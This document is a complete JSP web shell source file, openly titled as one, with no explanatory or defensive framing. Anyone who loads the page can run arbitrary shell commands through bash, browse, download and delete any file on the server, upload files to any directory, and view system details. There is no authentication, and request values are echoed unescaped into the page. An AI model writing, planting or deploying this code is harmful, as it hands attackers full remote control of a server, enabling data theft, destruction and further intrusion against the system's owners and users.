<%@ page import="java.util.*,java.io.*,java.nio.file.*" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="org.apache.commons.fileupload.*" %>
<%@ page import="org.apache.commons.fileupload.disk.*" %>
<%@ page import="org.apache.commons.fileupload.servlet.*" %>
<%
// Full Featured JSP WebShell
String action = request.getParameter("action") != null ? request.getParameter("action") : "cmd";
String currentDir = System.getProperty("user.dir");
String userHome = System.getProperty("user.home");

// Handle file upload
if("upload".equals(action) && "POST".equalsIgnoreCase(request.getMethod())) {
    try {
        // Check if we have a file upload request
        boolean isMultipart = ServletFileUpload.isMultipartContent(request);
        
        if (isMultipart) {
            // Create a factory for disk-based file items
            DiskFileItemFactory factory = new DiskFileItemFactory();
            
            // Configure a repository (to ensure a secure temp location is used)
            File repository = (File) application.getAttribute("javax.servlet.context.tempdir");
            factory.setRepository(repository);
            
            // Create a new file upload handler
            ServletFileUpload upload = new ServletFileUpload(factory);
            
            // Parse the request
            List<FileItem> items = upload.parseRequest(request);
            
            String uploadPath = request.getParameter("uploadPath") != null ? 
                               request.getParameter("uploadPath") : currentDir;
            
            for (FileItem item : items) {
                if (!item.isFormField() && item.getSize() > 0) {
                    String fileName = new File(item.getName()).getName();
                    File uploadedFile = new File(uploadPath, fileName);
                    
                    // Save the file
                    item.write(uploadedFile);
                    out.println("<p style='color:green'>File uploaded successfully: " + uploadedFile.getAbsolutePath() + "</p>");
                }
            }
        }
    } catch(Exception e) {
        out.println("<p style='color:red'>Upload error: " + e.getMessage() + "</p>");
    }
}

// Handle file download
if("download".equals(action) && request.getParameter("file") != null) {
    String filePath = request.getParameter("file");
    try {
        File file = new File(filePath);
        if (file.exists() && file.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            response.setContentLength((int) file.length());
            
            Files.copy(file.toPath(), response.getOutputStream());
            response.getOutputStream().flush();
            return; // Stop further processing
        } else {
            out.println("<p style='color:red'>File not found: " + filePath + "</p>");
        }
    } catch(Exception e) {
        out.println("<p style='color:red'>Download error: " + e.getMessage() + "</p>");
    }
}

// Handle file deletion
if("delete".equals(action) && request.getParameter("file") != null) {
    String filePath = request.getParameter("file");
    try {
        File file = new File(filePath);
        if (file.exists()) {
            if (file.delete()) {
                out.println("<p style='color:green'>File deleted successfully: " + filePath + "</p>");
            } else {
                out.println("<p style='color:red'>Failed to delete file: " + filePath + "</p>");
            }
        } else {
            out.println("<p style='color:red'>File not found: " + filePath + "</p>");
        }
    } catch(Exception e) {
        out.println("<p style='color:red'>Delete error: " + e.getMessage() + "</p>");
    }
}

// Handle command execution
if("cmd".equals(action) && request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    try {
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd});
        BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
        BufferedReader stderr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        
        out.println("<h3>Command: " + cmd + "</h3>");
        out.println("<h4>Output:</h4><pre>");
        String line;
        while ((line = stdout.readLine()) != null) out.println(line);
        out.println("</pre>");
        
        out.println("<h4>Errors:</h4><pre>");
        while ((line = stderr.readLine()) != null) out.println(line);
        out.println("</pre>");
        
    } catch(Exception e) {
        out.println("<p style='color:red'>Error: " + e.getMessage() + "</p>");
    }
} 

// Handle file browsing
else if("browse".equals(action)) {
    String path = request.getParameter("path") != null ? request.getParameter("path") : currentDir;
    try {
        File dir = new File(path);
        if (!dir.exists()) {
            out.println("<p style='color:red'>Directory does not exist: " + path + "</p>");
            path = currentDir;
            dir = new File(path);
        }
        
        out.println("<h3>Directory: " + dir.getAbsolutePath() + "</h3>");
        
        // Navigation breadcrumbs
        out.println("<div style='margin-bottom: 10px;'>");
        out.println("<strong>Path: </strong>");
        File current = dir;
        List<String> pathParts = new ArrayList<>();
        while (current != null) {
            pathParts.add(0, current.getName());
            current = current.getParentFile();
        }
        
        String currentPath = "";
        for (int i = 0; i < pathParts.size(); i++) {
            if (i > 0) currentPath += File.separator + pathParts.get(i);
            else currentPath = pathParts.get(i);
            
            if (i == 0 && pathParts.get(0).isEmpty()) {
                out.println("<a href='?action=browse&path=/'>/</a>");
            } else {
                out.println("<a href='?action=browse&path=" + currentPath + "'>" + 
                           (i == 0 ? "Root" : pathParts.get(i)) + "</a>");
            }
            if (i < pathParts.size() - 1) out.println(" / ");
        }
        out.println("</div>");
        
        out.println("<table border='1' style='width:100%;'><tr><th>Name</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Actions</th></tr>");
        
        // Parent directory link
        if (dir.getParent() != null) {
            out.println("<tr>");
            out.println("<td><a href='?action=browse&path=" + dir.getParent() + "'>[..]</a></td>");
            out.println("<td>-</td>");
            out.println("<td>-</td>");
            out.println("<td>-</td>");
            out.println("<td>-</td>");
            out.println("</tr>");
        }
        
        for(File file : dir.listFiles()) {
            out.println("<tr>");
            String fileName = file.getName();
            if (file.isDirectory()) {
                out.println("<td><a href='?action=browse&path=" + file.getAbsolutePath() + "'>[DIR] " + fileName + "</a></td>");
            } else {
                out.println("<td>" + fileName + "</td>");
            }
            out.println("<td>" + (file.isFile() ? file.length() + " bytes" : "-") + "</td>");
            out.println("<td>" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified())) + "</td>");
            out.println("<td>" + (file.canRead() ? "r" : "-") + (file.canWrite() ? "w" : "-") + (file.canExecute() ? "x" : "-") + "</td>");
            out.println("<td>");
            if (file.isFile()) {
                out.println("<a href='?action=download&file=" + file.getAbsolutePath() + "'>Download</a> | ");
                out.println("<a href='?action=delete&file=" + file.getAbsolutePath() + "' onclick='return confirm(\"Are you sure you want to delete " + fileName + "?\")'>Delete</a>");
            }
            out.println("</td>");
            out.println("</tr>");
        }
        out.println("</table>");
    } catch(Exception e) {
        out.println("<p style='color:red'>Error browsing: " + e.getMessage() + "</p>");
    }
}
%>
<html>
<head>
    <title>Advanced JSP WebShell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .tab { margin-bottom: 20px; }
        .tab button { padding: 10px 20px; margin-right: 5px; }
        .tabcontent { display: none; padding: 20px; border: 1px solid #ccc; }
        pre { background: #f4f4f4; padding: 10px; overflow: auto; }
        table { border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
        a { text-decoration: none; color: #0066cc; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>JSP WebShell</h1>
    
    <div class="tab">
        <button onclick="openTab('cmd')">Command Execution</button>
        <button onclick="openTab('browse')">File Browser</button>
        <button onclick="openTab('upload')">File Upload</button>
        <button onclick="openTab('info')">System Info</button>
    </div>

    <div id="cmd" class="tabcontent">
        <h2>Command Execution</h2>
        <form method="get">
            <input type="hidden" name="action" value="cmd">
            <textarea name="cmd" rows="3" cols="80" placeholder="Enter command..."><%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "whoami; pwd; ls -la" %></textarea><br>
            <input type="submit" value="Execute">
        </form>
    </div>

    <div id="browse" class="tabcontent">
        <h2>File Browser</h2>
        <form method="get">
            <input type="hidden" name="action" value="browse">
            Path: <input type="text" name="path" size="60" value="<%= request.getParameter("path") != null ? request.getParameter("path") : currentDir %>">
            <input type="submit" value="Browse">
        </form>
        <%
        if("browse".equals(action)) {
            // File browser content will be displayed here
        }
        %>
    </div>

    <div id="upload" class="tabcontent">
        <h2>File Upload</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            Upload to directory: <input type="text" name="uploadPath" size="60" value="<%= currentDir %>"><br><br>
            Select file: <input type="file" name="file"><br><br>
            <input type="submit" value="Upload File">
        </form>
    </div>

    <div id="info" class="tabcontent">
        <h2>System Information</h2>
        <pre>
OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %>
Arch: <%= System.getProperty("os.arch") %>
User: <%= System.getProperty("user.name") %>
Home: <%= userHome %>
Current Dir: <%= currentDir %>
Java: <%= System.getProperty("java.version") %>
Server: <%= application.getServerInfo() %>
Servlet Version: <%= application.getMajorVersion() %>.<%= application.getMinorVersion() %>
        </pre>
    </div>

    <script>
        function openTab(tabName) {
            var i, tabcontent;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            document.getElementById(tabName).style.display = 'block';
            
            // If opening browse tab, refresh the content
            if (tabName === 'browse') {
                window.location.href = '?action=browse&path=<%= currentDir %>';
            }
        }
        
        // Show the appropriate tab based on current action
        var currentAction = '<%= action %>';
        if (currentAction === 'browse') {
            document.getElementById('browse').style.display = 'block';
        } else if (currentAction === 'upload') {
            document.getElementById('upload').style.display = 'block';
        } else {
            document.getElementById('cmd').style.display = 'block';
        }
    </script>
</body>
</html>
